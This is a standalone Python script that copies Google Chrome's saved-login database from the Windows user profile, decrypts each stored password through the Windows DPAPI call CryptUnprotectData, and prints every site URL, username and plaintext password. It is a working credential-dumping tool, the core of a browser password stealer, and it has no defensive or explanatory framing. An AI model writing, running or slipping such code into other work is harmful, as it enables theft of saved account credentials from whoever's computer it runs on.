import os
import win32crypt
import sqlite3
import shutil

class Entry:

    origin_url = ''
    username = ''
    password = ''
    
    def __init__(self, origin_url, username, password):
        self.origin_url = origin_url
        self.username = username
        self.password = password

    def print(self):
        print(f'Origin URL: {self.origin_url}')
        print(f'Username: {self.username}')
        print(f'Password: {self.password}')

entries = []

def decrypt_password(password):
    try:
        password = win32crypt.CryptUnprotectData(password, None, None, None, 0)
        password = str(password[1])
        return password
    except:
        return ''

def get_chrome():
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome",
                            "User Data", "Default", "Login Data")
    
    copied_db = 'ChromeData.db'
    shutil.copyfile(db_path, copied_db)
    
    db = sqlite3.connect(copied_db)
    cursor = db.cursor()

    sql_query = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(sql_query)

    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        password = decrypt_password(row[2])

        if username:
            e = Entry(origin_url, username, password)
            entries.append(e)
        else:
            continue

        #printSeparator()


    # close and remove
    cursor.close()
    db.close()
    os.remove(copied_db)


def printInfo():
    for e in entries:
        e.print()
        printSeparator()

    withoutPassword = [e for e in entries if not e.password]
    print(len(withoutPassword))
    printSeparator()
    
    for e in entries:
        if not e.password:
            e.print()
            printSeparator()


def printSeparator():
    print('='*50)

def main():
    get_chrome()
    printInfo()


if __name__ == '__main__':
    main()

